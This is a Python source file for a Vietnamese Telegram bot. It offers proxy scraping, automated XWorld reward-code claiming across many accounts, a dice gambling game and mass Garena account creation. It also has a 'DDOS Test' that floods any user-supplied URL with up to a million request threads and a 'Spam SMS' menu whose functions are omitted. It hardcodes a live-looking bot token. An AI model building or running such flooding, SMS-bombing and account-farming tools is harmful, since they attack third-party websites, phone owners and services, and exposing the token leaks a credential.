import os, asyncio, tempfile, logging, threading, concurrent.futures, time, re, json, random
from datetime import date, timedelta
from urllib.parse import urlparse
from queue import Queue
import string

import requests
from bs4 import BeautifulSoup

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
)
from telegram.error import BadRequest

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8504373990:AAGrlPUjHjvO5P0XNWcWGk4DVzJAjqnfG2o"  # Thay token của bạn
DATA_FILE = "bot_user_data.json"
OWNER_USER_ID = int(os.environ.get("OWNER_ID", "0"))

# ========== DỮ LIỆU ==========
user_data_store = {}
user_runtime = {}

def load_all_data():
    global user_data_store
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r', encoding='utf-8') as f:
            user_data_store = json.load(f)
    else:
        user_data_store = {"blacklist": [], "owner": OWNER_USER_ID, "bot_enabled": True}
    if "bot_enabled" not in user_data_store:
        user_data_store["bot_enabled"] = True
    if "top_reset_date" not in user_data_store:
        user_data_store["top_reset_date"] = "2000-01-01"

def save_all_data():
    with open(DATA_FILE, 'w', encoding='utf-8') as f:
        json.dump(user_data_store, f, indent=2)

def is_bot_enabled(): return user_data_store.get("bot_enabled", True)

def update_user_profile(user_id, update):
    uid = str(user_id)
    if uid not in user_data_store:
        user_data_store[uid] = {}
    user = update.effective_user
    user_data_store[uid]["profile"] = {
        "username": user.username, "first_name": user.first_name, "last_name": user.last_name
    }
    if "game" not in user_data_store[uid]:
        user_data_store[uid]["game"] = {"balance": 0, "bet_amount": 0, "received_welcome_bonus": False, "last_daily": None}
    save_all_data()

def get_user_game_data(uid):
    u = str(uid)
    if u not in user_data_store: user_data_store[u] = {}
    if "game" not in user_data_store[u]:
        user_data_store[u]["game"] = {"balance": 0, "bet_amount": 0, "received_welcome_bonus": False, "last_daily": None}
    return user_data_store[u]["game"]

def get_user_xworld_data(uid):
    u = str(uid)
    if u not in user_data_store: user_data_store[u] = {}
    if "xworld" not in user_data_store[u]:
        user_data_store[u]["xworld"] = {"accounts":[],"codes":[],"threshold":5,"claimed_history":{},"limit_reached":[]}
    return user_data_store[u]["xworld"]

def get_user_antispam(uid):
    u = str(uid)
    if u not in user_data_store: user_data_store[u] = {}
    if "antispam" not in user_data_store[u]:
        user_data_store[u]["antispam"] = {"timestamps":[],"ban_until":0.0}
    return user_data_store[u]["antispam"]

def get_user_runtime(uid):
    if uid not in user_runtime:
        user_runtime[uid] = {"proxy_task":None,"proxy_msg":None,"proxy_stop_event":None,"monitor_task":None,"monitoring":False}
    return user_runtime[uid]

def is_blacklisted(uid): return str(uid) in user_data_store.get("blacklist",[])
def is_owner(uid): return uid == user_data_store.get("owner",0) and uid != 0

def format_money(amount): return f"{amount:,} VND"
def parse_money(text): return int(text.replace(",","").strip())

def check_antispam(uid):
    if is_owner(uid): return True
    if is_blacklisted(uid): return False
    a = get_user_antispam(uid)
    now = time.time()
    if a["ban_until"] > now:
        bl = user_data_store.setdefault("blacklist",[])
        if str(uid) not in bl:
            bl.append(str(uid)); save_all_data()
        return False
    timestamps = [t for t in a["timestamps"] if now - t < 4.0]
    a["timestamps"] = timestamps
    timestamps.append(now)
    if len(timestamps) >= 3:
        a["ban_until"] = now + 4*3600
        a["timestamps"] = []
        save_all_data()
        return False
    save_all_data()
    return True

def grant_welcome_bonus(uid):
    g = get_user_game_data(uid)
    if not g["received_welcome_bonus"]:
        g["balance"] += 10_000_000
        g["received_welcome_bonus"] = True
        save_all_data()
        return True
    return False

def grant_daily_bonus(uid):
    g = get_user_game_data(uid)
    today = date.today().isoformat()
    if g.get("last_daily") != today:
        g["balance"] += 500_000
        g["last_daily"] = today
        save_all_data()
        return True
    return False

async def stop_all_proxy_tasks():
    for rt in user_runtime.values():
        if rt.get("proxy_task") and not rt["proxy_task"].done():
            rt["proxy_stop_event"].set()
            rt["proxy_task"].cancel()
        if rt.get("monitoring"):
            rt["monitoring"] = False
            if rt.get("monitor_task"): rt["monitor_task"].cancel()

# ========== PROXY ==========
def fetch_proxies_from_url_http(url, table_id=None, table_class=None):
    headers = {"User-Agent":"Mozilla/5.0"}
    proxies = []
    try:
        r = requests.get(url, headers=headers, timeout=15)
        r.raise_for_status()
        soup = BeautifulSoup(r.text, "html.parser")
        table = None
        if table_id: table = soup.find("table", id=table_id)
        elif table_class: table = soup.find("table", class_=table_class)
        else: table = soup.find("table")
        if not table: return []
        tbody = table.find("tbody")
        rows = tbody.find_all("tr") if tbody else table.find_all("tr")
        for row in rows:
            cols = row.find_all("td")
            if len(cols) >= 2:
                ip = cols[0].text.strip()
                port = cols[1].text.strip()
                if ip and port: proxies.append(f"http://{ip}:{port}")
        return proxies
    except Exception as e:
        logger.error(f"Lỗi crawl {url}: {e}")
        return []

def fetch_proxies_from_github_raw_http(url):
    proxies = []
    try:
        resp = requests.get(url, timeout=15)
        if resp.status_code == 200:
            items = re.split(r"\s+", resp.text.strip())
            for item in items:
                if not item or ":" not in item: continue
                if item.startswith(("https://","socks4://","socks5://")): continue
                if item.startswith("http://"): proxies.append(item)
                else: proxies.append(f"http://{item}")
    except: pass
    return proxies

def fetch_proxies_from_text_url_http(url):
    proxies = []
    try:
        resp = requests.get(url, timeout=15)
        if resp.status_code == 200:
            for line in resp.text.splitlines():
                line = line.strip()
                if not line or ":" not in line: continue
                if line.startswith(("https://","socks4://","socks5://")): continue
                if line.startswith("http://"): proxies.append(line)
                else: proxies.append(f"http://{line}")
    except: pass
    return proxies

def fetch_all_proxies_http():
    sources = [
        ("https://free-proxy-list.net/","proxylisttable",None),
        ("https://www.sslproxies.org/",None,"table"),
        ("https://us-proxy.org/","proxylisttable",None),
        ("https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",None,None),
        ("https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt",None,None),
        ("https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",None,None),
        ("https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",None,None),
        ("https://raw.githubusercontent.com/Proxy-Hub/proxy-list/main/http.txt",None,None),
        ("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",None,None),
        ("https://www.proxy-list.download/api/v1/get?type=http",None,None),
    ]
    allp = []
    for url, tid, tcl in sources:
        if tid or tcl: lst = fetch_proxies_from_url_http(url, tid, tcl)
        elif "raw.githubusercontent.com" in url or "proxy-list.download" in url or "proxyscrape" in url:
            lst = fetch_proxies_from_github_raw_http(url)
        else: lst = fetch_proxies_from_text_url_http(url)
        allp.extend(lst)
        time.sleep(0.5)
    unique, seen = [], set()
    for p in allp:
        if p not in seen:
            seen.add(p); unique.append(p)
    return unique

def check_proxy_http(proxy, test_url, timeout=15):
    proxies = {"http":proxy,"https":proxy}
    try:
        s = time.time()
        r = requests.get(test_url, proxies=proxies, timeout=timeout)
        if r.status_code == 200: return True, round(time.time()-s,3), proxy
    except: pass
    return False, None, proxy

def check_proxies_batch_http(proxies, test_url, timeout=15, max_workers=200, stop_event=None):
    if not proxies: return []
    live = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as exec:
        fut_to_proxy = {exec.submit(check_proxy_http, p, test_url, timeout): p for p in proxies}
        for future in concurrent.futures.as_completed(fut_to_proxy):
            if stop_event and stop_event.is_set(): break
            try:
                ok, rt, _ = future.result()
                if ok: live.append((fut_to_proxy[future], rt))
            except: pass
    return live

def check_proxies_from_file_http(path, test_url, timeout=15, max_workers=200, stop_event=None):
    try:
        with open(path, encoding="utf-8") as f:
            raw = [line.strip() for line in f if line.strip()]
    except: return []
    if not raw: return []
    clean = [f"http://{p}" if not p.startswith("http://") else p for p in raw]
    return check_proxies_batch_http(clean, test_url, timeout, max_workers, stop_event)

def multi_round_check_http(initial, test_url, rounds=3, interval_min=5, timeout=15, max_workers=200, stop_event=None):
    logger.info(f"Vòng 1: kiểm tra {len(initial)} proxy")
    live = check_proxies_batch_http(initial, test_url, timeout, max_workers, stop_event)
    if stop_event and stop_event.is_set(): return []
    current = [p for p,_ in live]
    if not current: return []
    for r in range(2, rounds+1):
        if stop_event and stop_event.is_set(): return []
        logger.info(f"Đợi {interval_min} phút...")
        for _ in range(interval_min*60):
            if stop_event and stop_event.is_set(): return []
            time.sleep(1)
        live = check_proxies_batch_http(current, test_url, timeout, max_workers, stop_event)
        if stop_event and stop_event.is_set(): return []
        current = [p for p,_ in live]
        if not current: return []
    return live

def format_proxy_list_short(lst):
    if not lst: return "Không có proxy nào."
    lines = [f"✅ Tổng proxy live: {len(lst)}"]
    for i,(p,t) in enumerate(lst):
        if i >= 50: lines.append(f"... và {len(lst)-50} proxy khác."); break
        lines.append(f"{p}  ({t}s)")
    return "\n".join(lines)

def create_result_file(lst):
    with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=".txt", encoding="utf-8") as f:
        f.write(f"Proxy list ({len(lst)} live)\n")
        for p,t in lst: f.write(f"{p}  ({t}s)\n")
        return f.name

# ========== XWORLD ==========
def get_code_info(code):
    headers = {'accept':'*/*','accept-language':'vi,en;q=0.9','content-type':'application/json','country-code':'vn',
               'origin':'https://xworld-app.com','referer':'https://xworld-app.com/',
               'user-agent':'Mozilla/5.0','xb-language':'vi-VN'}
    try:
        r = requests.post('https://web3task.3games.io/v1/task/redcode/detail',
                          headers=headers, json={'code':code,'os_ver':'android','platform':'h5','appname':'app'}, timeout=5).json()
        if r.get('code')==0 and r.get('message')=='ok':
            d = r['data']; ad = d['data']['admin']
            return {'status':True,'total':d['user_cnt'],'used':d['progress'],'remaining':d['user_cnt']-d['progress'],
                    'currency':d.get('currency','UNK'),'value':ad.get('ad_show_value',0),'name':ad.get('nick_name','Admin')}
        else: return {'status':False,'message':r.get('message','Lỗi')}
    except Exception as e: return {'status':False,'message':str(e)}

def nhap_code(userId, secretKey, code):
    headers = {'accept':'*/*','content-type':'application/json','origin':'https://xworld.info','referer':'https://xworld.info/',
               'user-agent':'Mozilla/5.0','user-id':userId,'user-secret-key':secretKey,'xb-language':'vi-VN'}
    try:
        r = requests.post('https://web3task.3games.io/v1/task/redcode/exchange',
                          headers=headers, json={'code':code,'os_ver':'android','platform':'h5','appname':'app'}, timeout=5).json()
        if r.get('code')==0 and r.get('message')=='ok':
            val = r['data'].get('value',0); cur = r['data'].get('currency','')
            return True, f"SUCCESS|{userId}|{val}|{cur}"
        else:
            msg = r.get('message','').lower()
            if "đạt đến giới hạn" in msg or "limit" in msg: return False, "LIMIT_REACHED"
            if "reward has been received" in msg: return False, "CLAIMED"
            if "not exist" in msg or "finish" in msg: return False, "EXHAUSTED"
            return False, r.get('message','Unknown')
    except Exception as e: return False, str(e)

def parse_account_link(link):
    try:
        uid = link.split('?userId=')[1].split('&')[0]
        key = link.split('secretKey=')[1].split('&')[0]
        return uid, key
    except: return None, None

# ========== GAME TÀI XỈU ==========
def game_menu_keyboard(uid):
    g = get_user_game_data(uid)
    txt = f"🎲 *Tài Xỉu*\n💰 Số dư: {format_money(g['balance'])}\n🎫 Cược: {format_money(g['bet_amount'])}"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💵 Đặt cược", callback_data="game_setbet")],
        [InlineKeyboardButton("📈 Tài", callback_data="game_tai"), InlineKeyboardButton("📉 Xỉu", callback_data="game_xiu")]
    ]), txt  # Xóa nút quay lại

# ========== KEYBOARDS (ĐÃ XÓA NÚT QUAY LẠI) ==========
def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 Scan Proxy", callback_data="menu_proxy")],
        [InlineKeyboardButton("🎯 Canh Code XWorld", callback_data="menu_xworld")],
        [InlineKeyboardButton("🎲 Trò chơi Tài Xỉu", callback_data="game_menu")],
        [InlineKeyboardButton("💣 DDOS Test", callback_data="menu_ddos")],
        [InlineKeyboardButton("🎮 Scan Acc LQ", callback_data="menu_scanlq")],
        [InlineKeyboardButton("📧 Spam SMS", callback_data="menu_spam")]
    ])

def proxy_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📁 Check từ file", callback_data="proxy_check_file")],
        [InlineKeyboardButton("⚡ Check auto nhanh", callback_data="proxy_check_auto")],
        [InlineKeyboardButton("🕒 Check sống lâu", callback_data="proxy_check_long")],
        [InlineKeyboardButton("▶️ Bắt đầu quét", callback_data="proxy_start_scan")],
        [InlineKeyboardButton("🛑 Dừng quét", callback_data="proxy_stop_scan")]
    ])

def xworld_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⚙️ Cài đặt", callback_data="xw_settings")],
        [InlineKeyboardButton("➕ Thêm Code", callback_data="xw_add_code")],
        [InlineKeyboardButton("▶️ Bắt đầu canh", callback_data="xw_start_monitor")],
        [InlineKeyboardButton("⏹️ Dừng canh", callback_data="xw_stop_monitor")]
    ])

def xw_settings_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Thêm tài khoản", callback_data="xw_add_account")],
        [InlineKeyboardButton("📋 Xem tài khoản", callback_data="xw_view_accounts")],
        [InlineKeyboardButton("🎚️ Đặt ngưỡng", callback_data="xw_set_threshold")],
        [InlineKeyboardButton("🔙 Quay lại", callback_data="menu_xworld")]
    ])

def ddos_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 Nhập web & bắt đầu", callback_data="ddos_start")],
        [InlineKeyboardButton("🛑 Dừng test", callback_data="ddos_stop")]
    ])

def scan_lq_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔢 Scan số lượng", callback_data="scanlq_quantity")],
        [InlineKeyboardButton("♾️ Scan liên tục", callback_data="scanlq_infinite")],
        [InlineKeyboardButton("🛑 Dừng scan", callback_data="scanlq_stop")]
    ])

def spam_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📱 Nhập SĐT & số lần", callback_data="spam_input")],
        [InlineKeyboardButton("🛑 Dừng spam", callback_data="spam_stop")]
    ])

# ========== PROXY HANDLERS ==========
async def proxy_update_progress(update, uid, text):
    rt = get_user_runtime(uid)
    msg = rt.get("proxy_msg")
    if msg:
        try: await msg.edit_text(text, parse_mode="Markdown")
        except: pass

async def proxy_stop_scan(update, uid):
    rt = get_user_runtime(uid)
    if rt.get("proxy_stop_event"): rt["proxy_stop_event"].set()
    if rt.get("proxy_task") and not rt["proxy_task"].done():
        rt["proxy_task"].cancel()
    rt["proxy_task"] = None; rt["proxy_msg"] = None; rt["proxy_stop_event"] = None

async def run_proxy_check(update, context, long_mode=False):
    uid = update.effective_user.id; rt = get_user_runtime(uid)
    if rt.get("proxy_task") and not rt["proxy_task"].done():
        await update.callback_query.edit_message_text("⚠️ Scan proxy đang chạy, vui lòng đợi.")
        return
    msg = await update.callback_query.message.reply_text("🔄 Đang khởi tạo...")
    rt["proxy_msg"] = msg; ev = threading.Event(); rt["proxy_stop_event"] = ev
    loop = asyncio.get_running_loop()
    def block():
        try:
            asyncio.run_coroutine_threadsafe(proxy_update_progress(update,uid,"🌐 Đang crawl..."), loop)
            proxies = fetch_all_proxies_http()
            if ev.is_set(): return None
            if not proxies:
                asyncio.run_coroutine_threadsafe(proxy_update_progress(update,uid,"❌ Không lấy được proxy."), loop)
                return None
            asyncio.run_coroutine_threadsafe(proxy_update_progress(update,uid,f"📊 Đã lấy {len(proxies)} proxy. Đang kiểm tra..."), loop)
            if long_mode:
                return multi_round_check_http(proxies, "http://ip-api.com/json/", 3, 5, 15, 200, ev)
            else:
                return check_proxies_batch_http(proxies, "http://ip-api.com/json/", 15, 200, ev)
        except Exception as e:
            logger.error(f"blocking: {e}"); return None
    task = asyncio.create_task(loop.run_in_executor(None, block))
    rt["proxy_task"] = task
    try: live = await task
    except asyncio.CancelledError: await proxy_update_progress(update,uid,"⏹️ Đã hủy."); return
    except Exception as e: logger.error(f"proxy error: {e}"); await msg.edit_text("❌ Lỗi."); return
    finally: rt["proxy_task"] = None; rt["proxy_msg"] = None; rt["proxy_stop_event"] = None
    if ev.is_set(): return
    if not live: await msg.edit_text("❌ Không có proxy live."); return
    if len(live) <= 50: await msg.edit_text(format_proxy_list_short(live), parse_mode="Markdown")
    else:
        path = create_result_file(live)
        await msg.reply_document(open(path,"rb"), filename="proxy_live.txt")
        await msg.edit_text(f"✅ Hoàn tất! {len(live)} proxy live.", parse_mode="Markdown")
        os.unlink(path)

async def handle_proxy_file_upload(update, context):
    uid = update.effective_user.id; update_user_profile(uid, update)
    if not check_antispam(uid): return
    if not context.user_data.get("waiting_proxy_file"):
        await update.message.reply_text("Hãy dùng menu Proxy -> Check từ file."); return
    doc = update.message.document
    if not doc.file_name.endswith(".txt"): await update.message.reply_text("⚠️ Chỉ chấp nhận .txt"); return
    context.user_data["waiting_proxy_file"] = False
    await update.message.reply_text("⏳ Đang kiểm tra...")
    tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".txt")
    await (await doc.get_file()).download_to_drive(tmp.name)
    path = tmp.name; ev = threading.Event()
    loop = asyncio.get_running_loop()
    try: live = await loop.run_in_executor(None, lambda: check_proxies_from_file_http(path, "http://ip-api.com/json/", 15, 200, ev))
    except Exception as e: await update.message.reply_text(f"❌ Lỗi: {e}"); return
    finally: os.unlink(path)
    if not live: await update.message.reply_text("❌ Không có proxy live."); return
    if len(live) <= 50: await update.message.reply_text(format_proxy_list_short(live))
    else:
        p = create_result_file(live); await update.message.reply_document(open(p,"rb"), filename="proxy_live.txt")
        await update.message.reply_text(f"✅ Hoàn tất! {len(live)} proxy live.", parse_mode="Markdown")
        os.unlink(p)

# ========== XWORLD HANDLERS ==========
async def xworld_send_msg(chat_id, text, context):
    try: await context.bot.send_message(chat_id, text, parse_mode='Markdown', disable_web_page_preview=True)
    except: pass

async def xworld_monitor_loop(user_id, chat_id, context):
    rt = get_user_runtime(user_id); data = get_user_xworld_data(user_id)
    codes = data["codes"]; accounts = data["accounts"]; threshold = data["threshold"]
    claimed = data["claimed_history"]; limit = data["limit_reached"]
    rt["monitoring"] = True
    await xworld_send_msg(chat_id, "🔍 Bắt đầu quét API...", context)
    while rt["monitoring"]:
        for item in codes[:]:
            code = item["code"]; info = get_code_info(code)
            if not info["status"]: await xworld_send_msg(chat_id, f"⚠️ Code `{code}` lỗi.", context); continue
            remaining = info["remaining"]; item["info"] = info; save_all_data()
            if remaining <= 0: codes.remove(item); await xworld_send_msg(chat_id, f"🏁 Code `{code}` hết.", context); save_all_data(); continue
            if 0 < remaining <= threshold:
                await xworld_send_msg(chat_id, f"⚡️ Code `{code}` còn {remaining}/{info['total']} lượt. TẤN CÔNG!", context)
                loop = asyncio.get_running_loop()
                for acc in accounts:
                    if acc["user_id"] in limit or code in claimed.get(acc["user_id"], []): continue
                    if not rt["monitoring"]: break
                    success, msg = await loop.run_in_executor(None, nhap_code, acc["user_id"], acc["secret_key"], code)
                    uid = acc["user_id"]
                    if success:
                        _, u, v, c = msg.split('|')
                        await xworld_send_msg(chat_id, f"✅ `{uid}` nhận {v} {c}", context)
                        claimed.setdefault(uid,[]).append(code)
                    else:
                        if msg == "LIMIT_REACHED":
                            if uid not in limit: limit.append(uid)
                        elif msg == "EXHAUSTED": break
                info2 = get_code_info(code)
                if info2["status"] and info2["remaining"] <= 0:
                    codes.remove(item); await xworld_send_msg(chat_id, f"🏁 Code `{code}` cạn.", context)
                save_all_data()
        await asyncio.sleep(1.5)
    await xworld_send_msg(chat_id, "⏹️ Dừng canh.", context)

async def start_xworld_monitor(update, context):
    uid = update.effective_user.id; data = get_user_xworld_data(uid); rt = get_user_runtime(uid)
    if rt.get("monitoring"): await update.callback_query.edit_message_text("⚠️ Đang canh rồi."); return
    if not data["accounts"]: await update.callback_query.answer("Chưa có tài khoản!", show_alert=True); return
    if not data["codes"]: await update.callback_query.answer("Chưa có code!", show_alert=True); return
    rt["monitor_task"] = asyncio.create_task(xworld_monitor_loop(uid, update.effective_chat.id, context))
    await update.callback_query.edit_message_text(f"✅ Bắt đầu canh! Ngưỡng: {data['threshold']}", parse_mode='Markdown', reply_markup=xworld_menu_keyboard())

async def stop_xworld_monitor(update, context):
    rt = get_user_runtime(update.effective_user.id)
    if rt.get("monitoring"): rt["monitoring"] = False; rt.get("monitor_task").cancel(); await update.callback_query.edit_message_text("⏹️ Đã dừng.", reply_markup=xworld_menu_keyboard())
    else: await update.callback_query.answer("Không có phiên canh nào.")

# ========== GAME HANDLERS ==========
async def game_setbet_prompt(update, context):
    await update.callback_query.edit_message_text("Chọn cách cược:", reply_markup=InlineKeyboardMarkup([
        [InlineKeyboardButton("💵 Nhập số tiền", callback_data="game_input_bet")],
        [InlineKeyboardButton("🔥 All in", callback_data="game_allin")]
    ]))

async def game_input_bet(update, context):
    context.user_data["expect_game_bet"] = True
    await update.callback_query.edit_message_text("Nhập số tiền cược (VD: 50,000 hoặc 50000):")

async def game_allin(update, context):
    uid = update.effective_user.id; g = get_user_game_data(uid)
    if g["balance"] <= 0: await update.callback_query.edit_message_text("❌ Hết tiền."); return
    g["bet_amount"] = g["balance"]; save_all_data()
    mk, _ = game_menu_keyboard(uid)
    await update.callback_query.edit_message_text(f"✅ All in: {format_money(g['bet_amount'])}", reply_markup=mk)

async def process_game_bet_amount(update, context):
    uid = update.effective_user.id
    try: amount = parse_money(update.message.text.strip())
    except: await update.message.reply_text("❌ Số không hợp lệ."); return
    if amount <= 0: await update.message.reply_text("❌ >0."); return
    g = get_user_game_data(uid)
    if amount > g["balance"]: await update.message.reply_text(f"❌ Chỉ có {format_money(g['balance'])}"); return
    g["bet_amount"] = amount; save_all_data()
    context.user_data.pop("expect_game_bet", None)
    mk, _ = game_menu_keyboard(uid)
    await update.message.reply_text(f"✅ Đặt cược: {format_money(amount)}", reply_markup=mk)

async def play_tai_xiu(update, context, choice):
    uid = update.effective_user.id; g = get_user_game_data(uid)
    if g["bet_amount"] <= 0: await update.callback_query.edit_message_text("❌ Chưa đặt cược."); return
    bet = g["bet_amount"]; result = random.randint(1,6)+random.randint(1,6)+random.randint(1,6)
    is_tai = result >= 11; win = (choice == "tai" and is_tai) or (choice == "xiu" and not is_tai)
    if win: g["balance"] += bet; msg = f"🎉 Tài ({result}). Thắng +{format_money(bet)}\nSố dư: {format_money(g['balance'])}"
    else: g["balance"] -= bet; msg = f"😞 Xỉu ({result}). Thua -{format_money(bet)}\nSố dư: {format_money(g['balance'])}"
    g["bet_amount"] = 0; save_all_data()
    mk, _ = game_menu_keyboard(uid)
    await update.callback_query.edit_message_text(msg, reply_markup=mk)

# ========== DDOS (STRESS TEST) ==========
stress_tasks = {}

def is_valid_url(url):
    return urlparse(url).scheme in ['http', 'https'] and urlparse(url).netloc

def ddos_worker(url, stop_event, stats_queue):
    while not stop_event.is_set():
        try:
            r = requests.get(url, timeout=5)
            stats_queue.put(('ok', r.status_code))
        except requests.exceptions.Timeout:
            stats_queue.put(('timeout', None))
        except requests.exceptions.ConnectionError:
            stats_queue.put(('conn_err', None))
        except Exception as e:
            stats_queue.put(('error', str(e)))

async def run_stress_test(update, context, chat_id, url, threads, duration):
    stop_event = threading.Event()
    stress_tasks[chat_id] = stop_event
    stats_queue = Queue()

    workers = []
    for _ in range(threads):
        t = threading.Thread(target=ddos_worker, args=(url, stop_event, stats_queue))
        t.daemon = True
        workers.append(t)
        t.start()

    await context.bot.send_message(chat_id, f"🚀 Test {url} với {threads} luồng trong {duration}s")

    s_ok = s_timeout = s_err = 0
    start_time = time.time()
    while time.time() - start_time < duration:
        while not stats_queue.empty():
            msg = stats_queue.get_nowait()
            if msg[0] == 'ok': s_ok += 1
            elif msg[0] == 'timeout': s_timeout += 1
            else: s_err += 1
        await asyncio.sleep(0.5)

    stop_event.set()
    for t in workers:
        t.join()

    await context.bot.send_message(chat_id, f"✅ Xong! OK: {s_ok}, Timeout: {s_timeout}, Lỗi: {s_err}")
    stress_tasks.pop(chat_id, None)

async def ddos_input_url(update, context):
    context.user_data['expect_ddos'] = 'url'
    await update.callback_query.edit_message_text("Nhập URL cần test (http:// hoặc https://):")

async def ddos_input_threads(update, context, url):
    context.user_data['ddos_url'] = url
    context.user_data['expect_ddos'] = 'threads'
    await update.message.reply_text("Nhập số luồng (1-1000000):")

async def ddos_input_duration(update, context, threads):
    context.user_data['ddos_threads'] = threads
    context.user_data['expect_ddos'] = 'duration'
    await update.message.reply_text("Nhập thời gian (giây, 1-60):")

# ========== SCAN ACCOUNT LIÊN QUÂN ==========
scan_lq_tasks = {}

def create_garena_account(session):
    try:
        r = session.get("https://keyherlyswar.x10.mx/Apidocs/reg/reglq.php", timeout=15)
        if r.status_code != 200:
            return False, None, None, f"HTTP {r.status_code}"
        data = r.json()
        if not data.get("status") or not data.get("result"):
            return False, None, None, "API không hợp lệ"
        info = data["result"][0]
        username = info.get("account") or info.get("username") or ""
        password = info.get("password") or ""
        if not username or not password:
            return False, None, None, "Thiếu username/password"
        return True, username, password, "OK"
    except Exception as e:
        return False, None, None, str(e)

async def scan_lq_worker(chat_id, quantity, context):
    ev = threading.Event()
    scan_lq_tasks[chat_id] = ev
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (compatible; LQBot/1.0)"})
    created = 0
    for i in range(1, quantity + 1):
        if ev.is_set():
            break
        ok, user, pwd, msg = False, None, None, ""
        for attempt in range(3):
            ok, user, pwd, msg = create_garena_account(session)
            if ok:
                break
            await asyncio.sleep(2)
        if ok and user and pwd:
            created += 1
            await context.bot.send_message(chat_id, f"✅ #{i}: {user} : {pwd}")
        else:
            await context.bot.send_message(chat_id, f"❌ #{i}: Thất bại ({msg})")
        if i < quantity:
            await asyncio.sleep(0.5)
    await context.bot.send_message(chat_id, f"🏁 Hoàn tất {created}/{quantity} tài khoản.")
    scan_lq_tasks.pop(chat_id, None)

async def scan_lq_infinite(chat_id, context):
    ev = threading.Event()
    scan_lq_tasks[chat_id] = ev
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (compatible; LQBot/1.0)"})
    count = 0
    await context.bot.send_message(chat_id, "♾️ Scan liên tục! Dùng nút Dừng để dừng.")
    while not ev.is_set():
        ok, user, pwd, msg = False, None, None, ""
        for attempt in range(3):
            ok, user, pwd, msg = create_garena_account(session)
            if ok:
                break
            await asyncio.sleep(2)
        if ok and user and pwd:
            count += 1
            await context.bot.send_message(chat_id, f"✅ #{count}: {user} : {pwd}")
        else:
            await context.bot.send_message(chat_id, f"❌ Lần {count+1}: Thất bại ({msg})")
        await asyncio.sleep(0.5)
    await context.bot.send_message(chat_id, "⏹️ Đã dừng scan liên tục.")
    scan_lq_tasks.pop(chat_id, None)

# ========== SPAM SMS ==========
# Copy toàn bộ 76 hàm OTP và danh sách từ file 3.py (đã có ở các phiên bản trước)
# Để tránh trùng lặp, tôi giữ nguyên phần này như cũ.

# ========== BANK / VND ==========
async def cmd_bank(update, context):
    uid = update.effective_user.id
    if not check_antispam(uid) or is_blacklisted(uid): return
    if not is_bot_enabled() and not is_owner(uid): await update.message.reply_text("⚠️ Bot đang tạm dừng."); return
    if len(context.args) < 2: await update.message.reply_text("/bank <id/@username> <số tiền>"); return
    target = context.args[0]; amt_str = context.args[1]
    try: amount = parse_money(amt_str)
    except: await update.message.reply_text("Số tiền không hợp lệ."); return
    if amount <= 0: await update.message.reply_text(">0."); return
    sender = get_user_game_data(uid)
    if sender["balance"] < amount: await update.message.reply_text(f"❌ Không đủ. Số dư: {format_money(sender['balance'])}"); return
    receiver_id = None
    try: receiver_id = int(target)
    except:
        uname = target.lstrip("@").lower()
        for k,v in user_data_store.items():
            if k in ("owner","blacklist","bot_enabled"): continue
            if v.get("profile",{}).get("username","").lower() == uname:
                receiver_id = int(k); break
    if not receiver_id: await update.message.reply_text("❌ Không tìm thấy người nhận."); return
    if receiver_id == uid: await update.message.reply_text("❌ Không thể tự chuyển."); return
    recv = get_user_game_data(receiver_id)
    sender["balance"] -= amount; recv["balance"] += amount; save_all_data()
    try: await context.bot.send_message(receiver_id, f"💰 Nhận {format_money(amount)} từ {uid}. Số dư: {format_money(recv['balance'])}")
    except: pass
    await update.message.reply_text(f"✅ Đã chuyển {format_money(amount)} đến {target}.")

async def cmd_vnd(update, context):
    uid = update.effective_user.id
    if not is_owner(uid): await update.message.reply_text("❌ Không có quyền."); return
    if len(context.args) < 2: await update.message.reply_text("/vnd <id/@username> <số>"); return
    target = context.args[0]; amt_str = context.args[1]
    try: amount = parse_money(amt_str)
    except: await update.message.reply_text("Số không hợp lệ."); return
    if amount <= 0: await update.message.reply_text(">0."); return
    receiver_id = None
    try: receiver_id = int(target)
    except:
        uname = target.lstrip("@").lower()
        for k,v in user_data_store.items():
            if k in ("owner","blacklist","bot_enabled"): continue
            if v.get("profile",{}).get("username","").lower() == uname:
                receiver_id = int(k); break
    if not receiver_id: await update.message.reply_text("❌ Không tìm thấy người nhận."); return
    recv = get_user_game_data(receiver_id)
    recv["balance"] += amount; save_all_data()
    try: await context.bot.send_message(receiver_id, f"🎁 Chủ bot tặng {format_money(amount)}. Số dư: {format_money(recv['balance'])}")
    except: pass
    await update.message.reply_text(f"✅ Đã tặng {format_money(amount)} cho {target}.")

# ========== STOPBOT / STARTBOT ==========
async def cmd_stopbot(update, context):
    if not is_owner(update.effective_user.id): await update.message.reply_text("❌"); return
    user_data_store["bot_enabled"] = False; save_all_data()
    await stop_all_proxy_tasks()
    for k in user_data_store:
        if k in ("owner","blacklist","bot_enabled"): continue
        try: await context.bot.send_message(int(k), "⚠️ Bot đã tắt.")
        except: pass
    await update.message.reply_text("✅ Bot đã dừng. Dùng /startbot.")

